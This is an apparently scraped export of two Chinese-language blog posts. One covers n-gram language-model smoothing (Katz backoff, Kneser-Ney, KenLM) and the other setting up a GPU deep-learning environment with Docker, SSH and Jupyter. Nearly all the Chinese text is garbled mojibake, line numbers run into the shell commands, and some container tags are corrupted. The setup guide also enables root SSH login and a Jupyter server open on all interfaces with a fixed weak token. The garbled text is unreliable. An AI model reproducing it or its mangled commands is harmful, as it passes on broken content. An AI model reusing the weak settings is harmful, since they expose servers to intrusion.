å¯¹äºé¢‘ç‡è¶…è¿‡ä¸€å®šé˜ˆå€¼çš„è¯ï¼Œå®ƒä»¬çš„æ¦‚ç‡ä¼°è®¡å°±æ˜¯å®ƒä»¬åœ¨è¯­æ–™åº“ä¸­çš„ç›¸å¯¹é¢‘åº¦ï¼Œ å¯¹äºé¢‘ç‡å°äºé˜ˆå€¼çš„è¯ï¼Œå®ƒä»¬çš„æ¦‚ç‡ä¼°è®¡å°±å°äºå®ƒä»¬çš„ç›¸å¯¹é¢‘åº¦ï¼Œå¹¶ä¸”å‡ºç°æ¬¡æ•°è¶Šå°‘ï¼ŒæŠ˜æ‰£è¶Šå¤š å¯¹äºæœªçœ‹è§çš„è¯ï¼Œä¹Ÿç»™ä¸äº†ä¸€ä¸ªæ¯”è¾ƒå°çš„æ¦‚ç‡ å¡èŒ¨é€€é¿æ³•ï¼ˆæŠ˜æ‰£ï¼‰ ç”±å‰ IBM ç§‘å­¦å®¶å¡èŒ¨(S.M.Katz)æå‡ºã€‚ \\(\\sum_{w_{i-1},w_i\\text{ seen}}P(w_i\\mid w_{i-1})\\lt 1\\)ç±»ä¼¼å¤å¾·-å›¾çµä¼°è®¡çš„æ–¹æ³•ã€‚è¿™æ„å‘³ç€æœ‰ä¸€éƒ¨åˆ†æ¦‚ç‡é‡æ²¡æœ‰åˆ†é…å‡ºå»ï¼Œç•™ç»™äº†æ²¡æœ‰çœ‹åˆ°çš„äºŒå…ƒç»„ \\((w_{iâˆ’1},w_{i})\\)ï¼š \\[P(w_i\\mid w_{i-1})=\\begin{cases}f(w_i\\mid w_{i-1})\\quad\\text{if }N(w_{i-1},w_i) \\ge T \\\\f_{gt}(w_i\\mid w_{i-1})\\quad\\text{if }0\\lt N(w_{i-1},w_i)\\lt T \\\\ Q(w_{i-1})\\cdot f(w_i)\\quad\\text{otherwise}\\end{cases}\\] å…¶ä¸­ T æ˜¯é˜ˆå€¼ï¼Œä¸€èˆ¬åœ¨ 8âˆ’10 å·¦å³ï¼Œå‡½æ•° \\(f_{gt}()\\) è¡¨ç¤ºç»è¿‡å¤å¾·-å›¾çµä¼°è®¡åçš„ç›¸å¯¹é¢‘åº¦ã€‚è€Œ \\[Q(w_{i-1})=\\frac{1-\\sum_{w_i \\text{ seen}}P(w_i\\mid w_{i-1})}{\\sum_{w_i\\text{ unseen}}f(w_i)}\\] ç±»ä¼¼åœ°ï¼Œå¯¹äºä¸‰å…ƒæ¨¡å‹ï¼Œæ¦‚ç‡ä¼°è®¡çš„å…¬å¼å¦‚ä¸‹ï¼š \\[P(w_i\\mid w_{i-2},w_{i-1})=\\begin{cases}f(w_i\\mid w_{i-2},w_{i-1})\\quad\\text{if }N(w_{i-2,}w_{i-1},w_i) \\ge T \\\\f_{gt}(w_i\\mid w_{i-2,}w_{i-1})\\quad\\text{if }0\\lt N(w_{i-2},w_{i-1},w_i)\\lt T \\\\ Q(w_{i-2},w_{i-1})\\cdot P(w_i\\mid w_{i-1})\\quad\\text{otherwise}\\end{cases}\\] Absolute discounting Absolute discounting åŒ…æ‹¬äº†å¯¹é«˜é˜¶å’Œä½é˜¶æ¨¡å‹çš„å·®å€¼ï¼Œç„¶è€Œå®ƒå¹¶ä¸æ˜¯ç”¨é«˜é˜¶æ¨¡å‹çš„ P ä¹˜ä»¥ä¸€ä¸ª lambdaï¼Œè€Œæ˜¯ä»æ¯ä¸ªéé›¶è®¡æ•°é‡Œå‡æ‰ä¸€ä¸ªå›ºå®šçš„ discount Î´âˆˆ[0,1]ï¼Œä½œä¸ºtest setçš„è®¡æ•°ã€‚ image image Kneser-Ney smoothing Absolute discounting çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯¹å›é€€éƒ¨åˆ†åšäº†ä¸€ä¸ªä¿®æ­£ã€‚ åªæœ‰åœ¨é«˜é˜¶æ¨¡å‹çš„è®¡æ•°å¾ˆå°æˆ–è€…ä¸º 0 æ—¶ï¼Œä½é˜¶æ¨¡å‹æ‰æ˜¾å¾—é‡è¦ï¼Œ(åªæœ‰åœ¨ bigram æ²¡æœ‰å‡ºç°è¿‡æ—¶ï¼Œunigram æ‰æœ‰ç”¨)ã€‚é’ˆå¯¹è¯¥ç›®çš„è¿›è¡Œä¼˜åŒ–ã€‚ ç›®çš„ï¼š capture the diversity of contexts for the wordã€‚ image Modified Kneser-Ney smoothing æ ¹æ®é«˜é˜¶æ¨¡å‹ï¼ˆkå…ƒï¼‰çš„ç›¸å¯¹å¤§å°ï¼Œå¯¹ä½é˜¶æ¨¡å‹å¾—åˆ°çš„éƒ¨åˆ†è¿›è¡Œæ¯”ä¾‹åˆ†é…ã€‚ ç›®å‰åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæ•ˆæœæœ€å¥½çš„å¹³æ»‘æ–¹æ³•ã€‚ KenLMå·¥å…·æ„å»ºè¯­è¨€æ¨¡å‹ https://kheafield.com/code/kenlm/ â€‹ ä½¿ç”¨äº†Modified Kneser-Ney smoothingçš„è¯­è¨€æ¨¡å‹å·¥å…·åŒ…ã€‚å®‰è£…å’Œä½¿ç”¨è§notebookã€‚ 1pip install https://github.com/kpu/kenlm/archive/master.zip ç¥ç»è¯­è¨€é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹ BERTï¼ŒGPTç­‰ï¼ŒåŒæ ·å¯ä»¥åº”ç”¨åœ¨ä»¥ä¸Šé¢†åŸŸã€‚ç›¸å…³éƒ¨åˆ†åœ¨åé¢ç¬”è®°ä¸­ç»™å‡ºã€‚ å‚è€ƒèµ„æ–™: Andrej Karpathyçš„RNNåšå®¢ Language Model: A Survey of the State-of-the-Art Technology ä¼ ç»Ÿn-gramæ¨¡å‹ç®€å•å®ç”¨ï¼Œä½†æ˜¯æ•°æ®çš„ç¨€ç–æ€§å’Œæ³›åŒ–èƒ½åŠ›æœ‰å¾ˆå¤§çš„é—®é¢˜ã€‚ â€‹ å½“æ–°çš„æ–‡æœ¬ä¸­å‡ºç°æ„ä¹‰ç›¸è¿‘ä½†æ˜¯æ²¡æœ‰åœ¨è®­ç»ƒæ–‡æœ¬ä¸­å‡ºç°çš„å•è¯æˆ–è€…å•è¯ç»„çš„æ—¶å€™ï¼Œä¼ ç»Ÿç¦»æ•£æ¨¡å‹æ— æ³•æ­£ç¡®è®¡ç®—è¿™äº›è®­ç»ƒæ ·æœ¬ä¸­æœªå‡ºç°çš„å•è¯çš„åº”æœ‰æ¦‚ç‡ï¼Œä»–ä»¬éƒ½ä¼šè¢«èµ‹äºˆ0æ¦‚ç‡é¢„æµ‹å€¼ã€‚ â€‹ é™¤äº†å¯¹æœªå‡ºç°çš„å•è¯æœ¬èº«è¿›è¡Œé¢„æµ‹éå¸¸å›°éš¾ä¹‹å¤–ï¼Œç¦»æ•£æ¨¡å‹è¿˜ä¾èµ–äºå›ºå®šå•è¯ç»„åˆï¼Œéœ€è¦å®Œå…¨çš„æ¨¡å¼åŒ¹é…ï¼Œå¦åˆ™ä¹Ÿæ— æ³•æ­£ç¡®è¾“å‡ºå•è¯ç»„å‡ºç°çš„æ¦‚ç‡ã€‚ â€‹ ç¦»æ•£æ¨¡å‹åœ¨è®¡ç®—ä¸Šè¿˜å­˜åœ¨â€œç»´åº¦è¯…å’’â€çš„å›°éš¾ã€‚å‡è®¾æˆ‘ä»¬çš„è¯åº“æœ‰ä¸€ä¸‡ä¸ªç‹¬ç«‹å•è¯ï¼Œå¯¹äºä¸€ä¸ªåŒ…å«4ä¸ªå•è¯çš„è¯ç»„æ¨¡å¼ï¼Œæ½œåœ¨çš„å•è¯ç»„åˆå¤šè¾¾\\(10000^4\\)ã€‚ ç¥ç»ç½‘ç»œæ¨¡å‹ï¼šå‰é¦ˆç¥ç»ç½‘ç»œæ¨¡å‹ï¼ˆFFLMï¼‰å’Œå¾ªç¯ç¥ç»ç½‘ç»œæ¨¡å‹ï¼ˆRNNLMï¼‰ã€‚å‰è€…ä¸»è¦è®¾è®¡æ¥è§£å†³ç¨€ç–æ€§é—®é¢˜ï¼Œè€Œåè€…ä¸»è¦è®¾è®¡æ¥è§£å†³æ³›åŒ–èƒ½åŠ›ï¼Œå°¤å…¶æ˜¯å¯¹é•¿ä¸Šä¸‹æ–‡ä¿¡æ¯çš„å¤„ç†ã€‚ å‰é¦ˆç¥ç»ç½‘ç»œæ¨¡å‹ï¼ˆFFLMï¼‰ Bengioç­‰äººæå‡ºçš„ç¬¬ä¸€ä¸ªå‰é¦ˆç¥ç»ç½‘ç»œæ¨¡å‹åˆ©ç”¨ä¸€ä¸ªä¸‰å±‚ï¼ŒåŒ…å«ä¸€ä¸ªåµŒå…¥å±‚ã€ä¸€ä¸ªå…¨è¿æ¥å±‚ã€ä¸€ä¸ªè¾“å‡ºå±‚ï¼Œçš„å…¨è¿æ¥ç¥ç»ç½‘ç»œæ¨¡å‹æ¥ä¼°è®¡ç»™å®šn-1ä¸ªä¸Šæ–‡çš„æƒ…å†µä¸‹ï¼Œç¬¬nä¸ªå•è¯å‡ºç°çš„æ¦‚ç‡ã€‚å…¶æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š image FFLMå‡è®¾æ¯ä¸ªè¾“å…¥éƒ½æ˜¯ç‹¬ç«‹çš„ã€‚è€Œå¾ªç¯ç¥ç»ç½‘ç»œçš„ç»“æ„èƒ½åˆ©ç”¨æ–‡å­—çš„è¿™ç§ä¸Šä¸‹æ–‡åºåˆ—å…³ç³»ã€‚ å¾ªç¯ç¥ç»ç½‘ç»œæ¨¡å‹ï¼ˆRNNLMï¼‰ å¾ªç¯ç¥ç»ç½‘ç»œæ¨¡å‹ä¸è¦æ±‚å›ºå®šçª—å£çš„æ•°æ®è®­ç»ƒã€‚ image RNNè¯­è¨€æ¨¡å‹è®­ç»ƒè¿‡ç¨‹ï¼š image RNNè¯­è¨€æ¨¡å‹åå‘ä¼ æ’­: image è¯­è¨€æ¨¡å‹è¯„ä¼° å›°æƒ‘åº¦ï¼ˆperplexityï¼‰ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯ç»™æµ‹è¯•é›†çš„å¥å­èµ‹äºˆè¾ƒé«˜æ¦‚ç‡å€¼çš„è¯­è¨€æ¨¡å‹è¾ƒå¥½ã€‚perplexityè¶Šå°ï¼Œå¥å­æ¦‚ç‡è¶Šå¤§ï¼Œè¯­è¨€æ¨¡å‹è¶Šå¥½ã€‚ image ä¹Ÿå°±æ˜¯ï¼Œ\\(2^{-crossentropyloss}\\) image","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"},{"name":"smoothing","slug":"smoothing","permalink":"https://racleray.github.io/tags/smoothing/"},{"name":"KenLM","slug":"KenLM","permalink":"https://racleray.github.io/tags/KenLM/"}]},{"title":"Linux+Dockeræ·±åº¦å­¦ä¹ ç¯å¢ƒ","slug":"Linux-Dockeræ·±åº¦å­¦ä¹ ç¯å¢ƒ","date":"2020-07-06T14:50:10.000Z","updated":"2023-08-07T11:54:31.031Z","comments":true,"path":"posts/accc2125.html","link":"","permalink":"https://racleray.github.io/posts/accc2125.html","excerpt":"è®°å½•åœ¨Dockerä¸­æ­å»ºæ·±åº¦å­¦ä¹ ç¯å¢ƒçš„è¿‡ç¨‹ã€‚","text":"Dockerä¸­æ­å»ºæ·±åº¦å­¦ä¹ ç¯å¢ƒ å®¿ä¸»æœºéƒ¨åˆ† aptæºä¿®æ”¹ï¼š 12345sudo mv /etc/apt/sources.list /etc/apt/sources.list.baklsb_release -c # ç³»ç»Ÿç‰ˆæœ¬sudo vim /etc/apt/sources.list å†™å…¥ 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 12sudo apt-get updatesudo apt-get upgrade å®‰è£…pythonå’Œpip 12apt-get install python3apt-get install python3-pip é…ç½®è½¯è¿æ¥ 12ln -s /usr/local/python3/bin/python3 /usr/bin/python3ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 123456789mkdir ~/.pipcd ~/.piptouch pip.confcat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF[global]timeout = 6000index-url = https://pypi.tuna.tsinghua.edu.cn/simpletrusted-host = pypi.tuna.tsinghua.edu.cnEOF æŸ¥è¯¢CUDAï¼ŒæŒ‰ç…§å®˜ç½‘æŒ‡ç¤ºå®‰è£…ï¼Œå¯é€‰æ‹©ä¸åŒæ–¹æ³•ï¼Œlocalæˆ–è€…networkç­‰ æ³¨æ„ï¼ï¼ äº‘ä¸»æœºä¸Šå®‰è£…cudaæ—¶ï¼Œå¯èƒ½éœ€è¦åŠ ä¸Š --no-opengl-libs æŸ¥è¯¢é©±åŠ¨ç‰ˆæœ¬ï¼šå¯æ‰‹åŠ¨ä¸‹è½½å®‰è£…åŒ…åˆ°æœ¬åœ°å®‰è£… é¦–å…ˆå¸è½½æ‰ä¹‹å‰çš„æ˜¾å¡é©±åŠ¨ï¼š 1apt-get remove â€“purge nvidia* ä¹Ÿå¯ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹æ¨èé©±åŠ¨ 1ubuntu-drivers devices 1sudo apt install --no-install-recommends &lt;æ¨èé©±åŠ¨&gt; ä¸‹è½½ä¸äº†å¯æ·»åŠ ppa 123sudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updatesudo apt install &lt;æ¨èé©±åŠ¨&gt; ä¹‹å‰å®‰è£…è¿‡cudaéœ€è¦é‡æ–°å®‰è£…çš„è¯å¯ä»¥é€‰æ‹©å…ˆå¸è½½ï¼Œä»¥å…å’Œæ–°çš„ CUDA ç‰ˆæœ¬äº§ç”Ÿå†²çª: /usr/local/cuda/bin ç›®å½•ä¸‹æœ‰ä¸€ä¸ª uninstallcuda*.pl æ–‡ä»¶ 1./uninstall_cuda_10.0.pl å¯èƒ½ä¼šå¸è½½ä¸å¹²å‡€, å¯ä»¥å†æ‰§è¡Œå‘½ä»¤åˆ é™¤cudaç›®å½• 12rm -rf /usr/bin/cudarm -rf /usr/bin/cuda-10.0 æŸ¥è¯¢ä¸‹è½½cudnn è§£å‹ä¸‹è½½çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°cudaæ–‡ä»¶å¤¹ï¼Œåœ¨å½“å‰ç›®å½•æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 12345cp cuda/include/cudnn.h /usr/local/cuda/include/cp cuda/lib64/libcudnn* /usr/local/cuda/lib64/chmod a+r /usr/local/cuda/include/cudnn.hchmod a+r /usr/local/cuda/lib64/libcudnn* ç½‘ç»œä¸‹è½½é€Ÿåº¦å¿«ä¹Ÿå¯ä»¥å‚è€ƒtensorflowå®˜ç½‘çš„æ•™ç¨‹ï¼š 12345678910111213141516171819202122232425# https://www.tensorflow.org/install/gpu#install_cuda_with_apt# Add NVIDIA package repositorieswget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-repo-ubuntu1804_10.1.243-1_amd64.debsudo dpkg -i cuda-repo-ubuntu1804_10.1.243-1_amd64.debsudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pubsudo apt-get updatewget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.debsudo apt install ./nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.debsudo apt-get update# Install NVIDIA driversudo apt-get install --no-install-recommends nvidia-driver-418 # å¯æ›´æ”¹ä¸ºæ¨èç‰ˆæœ¬# Reboot. Check that GPUs are visible using the command: nvidia-smi# Install development and runtime libraries (~4GB)sudo apt-get install --no-install-recommends --no-opengl-libs \\ cuda-10-1 \\ libcudnn7=7.6.4.38-1+cuda10.1 \\ libcudnn7-dev=7.6.4.38-1+cuda10.1# æ‰§è¡ŒinferenceåŠ é€Ÿçš„æœåŠ¡å™¨å®‰è£…ï¼Œä¹Ÿå¯å¼€å‘è°ƒè¯•# Install TensorRT. Requires that libcudnn7 is installed above.sudo apt-get install -y --no-install-recommends libnvinfer6=6.0.1-1+cuda10.1 \\ libnvinfer-dev=6.0.1-1+cuda10.1 \\ libnvinfer-plugin6=6.0.1-1+cuda10.1 äº‘ä¸»æœºæŒ‚è½½æ–°åˆ†åŒº æŸ¥çœ‹æ˜¯å¦æœ‰å¤šä½™çš„ç›˜æ¯”å¦‚/dev/vdb 1fdisk -l å¦‚æœæœ‰åˆ™è¿›è¡Œåˆ†åŒº 1fdisk /dev/vdb è¿›å…¥äº¤äº’ï¼š 1.è¾“å…¥ n å¹¶æŒ‰å›è½¦é”®ï¼šåˆ›å»ºä¸€ä¸ªæ–°åˆ†åŒºã€‚ 2.è¾“å…¥ p å¹¶æŒ‰å›è½¦é”®ï¼šé€‰æ‹©ä¸»åˆ†åŒºã€‚å› ä¸ºåˆ›å»ºçš„æ˜¯ä¸€ä¸ªå•åˆ†åŒºæ•°æ®ç›˜ï¼Œæ‰€ä»¥åªéœ€è¦åˆ›å»ºä¸»åˆ†åŒºã€‚ 3.è¾“å…¥åˆ†åŒºç¼–å·å¹¶æŒ‰å›è½¦é”®ã€‚å¯ä»¥è¾“å…¥ 1ã€‚ 4.è¾“å…¥ç¬¬ä¸€ä¸ªå¯ç”¨çš„æ‰‡åŒºç¼–å·ï¼šæŒ‰å›è½¦é”®é‡‡ç”¨é»˜è®¤å€¼ 1ã€‚ 5.è¾“å…¥æœ€åä¸€ä¸ªæ‰‡åŒºç¼–å·ï¼šå› ä¸ºè¿™é‡Œä»…åˆ›å»ºä¸€ä¸ªåˆ†åŒºï¼Œæ‰€ä»¥æŒ‰å›è½¦é”®é‡‡ç”¨é»˜è®¤å€¼ã€‚ 6.è¾“å…¥ wq å¹¶æŒ‰å›è½¦é”®ï¼Œå¼€å§‹åˆ†åŒºã€‚ 12#æ˜¯å¦æœ‰æ–°åˆ†åŒº /dev/vdb1fdisk -l æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ 12#/mntæ˜¯å®¿ä¸»æœºçš„ç›®å½•mount /dev/vdb1 /mnt æŸ¥çœ‹æŒ‚è½½æ˜¯å¦æˆåŠŸ 1df -h Dockeréƒ¨åˆ† å®‰è£…docker ceï¼Œæ ¹æ®å®˜ç½‘æ•™ç¨‹ ç›®å‰å·²ç»ä¸æ¨èä½¿ç”¨nvidia-docker2äº†ï¼Œç›´æ¥ä½¿ç”¨ nvidia-container-toolkit å³å¯ã€‚ 1234567# Add the package repositoriesdistribution=$(. /etc/os-release;echo $ID$VERSION_ID)curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.listsudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkitsudo systemctl restart docker Usage 12345678910111213#### Test nvidia-smi with the latest official CUDA imagedocker run --gpus all nvidia/cuda:10.0ï¼‘base nvidia-smi# Start a GPU enabled container on two GPUsdocker run --gpus 2 nvidia/cuda:10.ï¼‘-base nvidia-smi# Starting a GPU enabled container on specific GPUsdocker run --gpus '\"device=1,2\"' nvidia/cuda:10.ï¼‘-base nvidia-smidocker run --gpus '\"device=UUID-ABCDEF,1\"' nvidia/cuda:10.ï¼‘-base nvidia-smi# Specifying a capability (graphics, compute, ...) for my container# Note this is rarely if ever used this waydocker run --gpus all,capabilities=utility nvidia/cuda:10.ï¼‘-base nvidia-smi nivdiaå®˜æ–¹é•œåƒï¼šhttps://gitlab.com/nvidia/container-images/cuda/blob/master/doc/supported-tags.md pytorché•œåƒï¼šhttps://hub.docker.com/r/opencompetition/opencompetition tensorflowé•œåƒï¼šhttps://www.tensorflow.org/install/docker ï¼ˆOptionalï¼‰ä¿®æ”¹Dockeræœ¬åœ°é•œåƒä¸å®¹å™¨çš„å­˜å‚¨ä½ç½® å¦‚æœæ ¹åˆ†åŒºå¤ªå°çš„è¯ é¦–å…ˆåœæ‰DockeræœåŠ¡ï¼š 1systemctl stop docker ç„¶åç§»åŠ¨æ•´ä¸ª/var/lib/dockerç›®å½•åˆ°ç›®çš„è·¯å¾„ï¼š 12sudo mv /var/lib/docker &lt;ç›®æ ‡è·¯å¾„&gt;sudo ln -s &lt;ç›®æ ‡è·¯å¾„&gt; /var/lib/docker ç„¶å 1systemctl start docker ï¼ˆOptionalï¼‰ä¿®æ”¹ç”¨æˆ·å¯†ç  ubuntuçš„é»˜è®¤rootå¯†ç æ˜¯éšæœºçš„ï¼Œæ¯æ¬¡å¼€æœºéƒ½ä¼šæœ‰ä¸€ä¸ªæ–°çš„rootå¯†ç ã€‚ 1sudo passwd ç„¶åä¼šæç¤ºè¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç ã€‚ 1su root è½¬ä¸ºrootåï¼Œä¿®æ”¹ç”¨æˆ·å¯†ç  1sudo passwd user å¸¸ç”¨Dockeræ“ä½œ imageï¼Œé•œåƒï¼Œæ˜¯ä¸€ä¸ªä¸ªé…ç½®å¥½çš„ç¯å¢ƒã€‚ containerï¼Œå®¹å™¨ï¼Œæ˜¯imageçš„å…·ä½“å®ä¾‹ã€‚ docker run [-it] some-image åˆ›å»ºæŸä¸ªé•œåƒçš„å®¹å™¨ docker psåˆ—å‡ºå½“å‰è¿è¡Œçš„å®¹å™¨ docker ps -aåˆ—å‡ºæ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬è¿è¡Œçš„å’Œä¸è¿è¡Œçš„ docker rm container-idåˆ é™¤æŸä¸ªå®¹å™¨ docker start [-i] container-idå¯åŠ¨æŸä¸ªå®¹å™¨ï¼Œå¿…é¡»æ˜¯å·²ç»åˆ›å»ºçš„ -iè¿›å…¥äº¤äº’æ¨¡å¼ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šdocker attach container-id CTRL+Dæˆ–è€…è¾“å…¥exitï¼Œé€€å‡º docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH å®¹å™¨åˆ°ä¸»æœº docker cp [OPTIONS] SRC_PATH CONTAINER:DEST_PATH ä¸»æœºåˆ°å®¹å™¨ eg: docker cp /home/racle/package_data nlptools:/home/deepspeed/package_data åœæ­¢ã€é‡å¯ï¼š docker stop container-id docker restart container-id ç»™é•œåƒæ‰“æ ‡ç­¾ 1docker tag &lt;image id&gt; username/imagename:version æ˜ å°„ 12345678sudo docker run -it / --gpus all / -p 8000:22 / -p 9999:8888 / --ipc=host / -v &lt;ä¸»æœºæ–‡ä»¶è·¯å¾„&gt;:&lt;å®¹å™¨æ–‡ä»¶è·¯å¾„&gt; / --name &lt;åç§°&gt; / &lt;image id&gt; -p 9999:8888 æŠŠä¸»æœºçš„9999ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„8888ç«¯å£ -p 8000:22 ç•™ä¸€ä¸ªç«¯å£æ˜ å°„åˆ°å®¹å™¨22ç«¯å£ï¼Œå› ä¸ºSFTPé»˜è®¤ä½¿ç”¨22ç«¯å£ã€‚ --ipc=host è®©å®¹å™¨ä¸ä¸»æœºå…±äº«å†…å­˜ -v : æ–‡ä»¶è·¯å¾„æ˜ å°„ e.g. /home/racle/dockerVol/:/home/ralce/ æˆ–è€…å®¹å™¨å¯åŠ¨çš„æ—¶å€™æŒ‚è½½ç›®å½• 1--mount type&#x3D;bind,source&#x3D;paht,target&#x3D;path jupyter notebook åˆ›å»ºäº†å®¹å™¨ä¹‹åï¼Œå¯åŠ¨jupyter notebookï¼š 12345678910jupyter-notebook --generate-configsed -i 's/#c.NotebookApp.allow_password_change/c.NotebookApp.allow_password_change/g' ~/.jupyter/jupyter_notebook_config.pycat &gt;&gt; ~/.jupyter/jupyter_notebook_config.py &lt;&lt; EOFc = get_config()c.NotebookApp.ip = '*'c.NotebookApp.open_browser = Falsec.NotebookApp.port = 8888c.NotebookApp.token='666666'EOF 1jupyter notebook --no-browser --ip=0.0.0.0 --notebook-dir='' --no-browserå³ä¸é€šè¿‡æµè§ˆå™¨å¯åŠ¨ --allow-rootå…è®¸rootæ¨¡å‹è¿è¡Œ ç«¯å£é…ç½® å®¹å™¨é‡Œ é…ç½®SSHæœåŠ¡ï¼Œé¦–å…ˆå®‰è£…*openssh-server*: 1apt install -y openssh-server å»ºç«‹ä¸€ä¸ªé…ç½®æ–‡ä»¶å¤¹å¹¶è¿›è¡Œå¿…è¦çš„é…ç½®ï¼š 1234567891011$ mkdir /var/run/sshd$ sudo passwd# è¿™é‡Œè®¾ç½®çš„rootå¯†ç ï¼Œä¸€å®šè¦è®°ä½ï¼# ä½¿ç”¨å…¶ä»–ç”¨æˆ·è¿æ¥ï¼Œå¯ç”¨rootæƒé™è®¾ç½®å¯†ç ï¼š passwd username# å°†#PermitRootLogin prohibit-password æ›¿æ¢ä¸º PermitRootLogin yes$ sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config# å°†session\\s*required\\s*pam_loginuid.so æ›¿æ¢ä¸º session optional pam_loginuid.so$ sed 's@session\\s*required\\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd$ echo \"export VISIBLE=now\" &gt;&gt; /etc/profile 1$ sudo service ssh restart åœ¨æœåŠ¡å™¨ï¼ˆå®¿ä¸»æœºï¼‰ä¸Š æµ‹è¯•åˆšåˆšæ–°å»ºdockerå®¹å™¨ä¸­ç«¯å£è½¬å‘çš„22ç«¯å£ï¼š 1$ sudo docker port [your_container_name] 22 NOTEï¼šå¯èƒ½sshé»˜è®¤å¼€å¯çš„ç«¯å£ä¸æ˜¯22ï¼Œéœ€è¦åœ¨/etc/ssh/sshd_configä¸­ä¿®æ”¹ port ä¸º 22 1netstat -tnlp # æŸ¥çœ‹å½“å‰æœºå™¨å¼€å¯çš„ç«¯å£ æµ‹è¯•èƒ½å¦ç”¨SSHè¿æ¥åˆ°è¿œç¨‹dockerï¼š 1$ ssh root@[your_host_ip] -p 8000 ä¸‹é¢å°±å¯ä»¥é€šè¿‡pychramå’Œjupyterè¿œç¨‹è¿æ¥æœåŠ¡å™¨ä¸Šçš„dockeräº† æœ¬åœ°ä¸æœåŠ¡å™¨çš„ç«¯å£æ˜ å°„ï¼Œä»è€Œè¿œç¨‹ç™»å½•jupyterï¼š(è¿œç¨‹é“¾æ¥åˆ°å®¿ä¸»æœºè¢«æ˜ å°„çš„ç«¯å£)ï¼š 1ssh username@host-ip -L 8888:127.0.0.1:9999 è¿œç¨‹å¯é€šè¿‡å®¿ä¸»æœºipçš„8888ç«¯å£è®¿é—®jupyter dockeré‡å¯æ—¶ä¹Ÿéœ€è¦é‡å¯sshæœåŠ¡ï¼š 1$ sudo service ssh restart å¤‡ä»½ é€šè¿‡docker psæˆ–è€…docker ps -aæ¥æŸ¥çœ‹ä½ æƒ³å¤‡ä»½çš„å®¹å™¨çš„idï¼Œ ç„¶åé€šè¿‡ï¼š 1docker commit -p [your-container-id] [your-backup-name] æ¥å°†your-container-idçš„å®¹å™¨åˆ›å»ºæˆä¸€ä¸ªé•œåƒå¿«ç…§ é€šè¿‡docker imageså°±å¯ä»¥æŸ¥çœ‹åˆ°åˆšåˆšåˆ›å»ºå¥½çš„é•œåƒå¿«ç…§äº† é€šè¿‡ï¼š 1docker save -o [path-you-want-to-save/your-backup-name.tar]] [your-backup-name] æŠŠé‚£ä¸ªé•œåƒæ‰“åŒ…æˆtaræ–‡ä»¶ï¼Œä¿å­˜åˆ°æœåŠ¡å™¨ä¸Šã€‚ æ¢å¤ï¼š docker load -i your-backup-name.tar 1docker run -d -p 80:80 your-backup-name pycharmè¿æ¥ PyCharm*Tools &gt; Deployment &gt; Configuration*, æ–°å»ºä¸€ä¸ª*SFTP*æœåŠ¡å™¨ï¼Œåå­—è‡ªå·±å– image è¾“å…¥å¦‚ä¸‹å›¾é…ç½® image åœ¨Mappingsä¸­é…ç½®è·¯å¾„ï¼Œè¿™é‡Œçš„è·¯å¾„æ˜¯ä½ æœ¬åœ°å­˜æ”¾ä»£ç çš„è·¯å¾„ï¼Œä¸åˆšåˆšé…ç½®çš„Root Pathç›¸äº’æ˜ å°„ï¼ˆåŒdockerä¸­å®¿ä¸»æœºä¸å®¹å™¨çš„å…³ç³»ï¼‰ image é…ç½®è¿œç¨‹è§£é‡Šå™¨ ç‚¹å‡»PyCharmçš„File &gt; Setting &gt; Project &gt; Project Interpreterå³è¾¹çš„è®¾ç½®æŒ‰é’®æ–°å»ºä¸€ä¸ªé¡¹ç›®çš„è¿œç¨‹è§£é‡Šå™¨ï¼š image image é…ç½®å®Œæˆã€‚é…ç½®å®Œæˆä»¥åéœ€è¦ç­‰æœ¬åœ°å’Œè¿œç¨‹çš„ç¯å¢ƒåŒæ­¥ä¸€ä¸‹ã€‚ 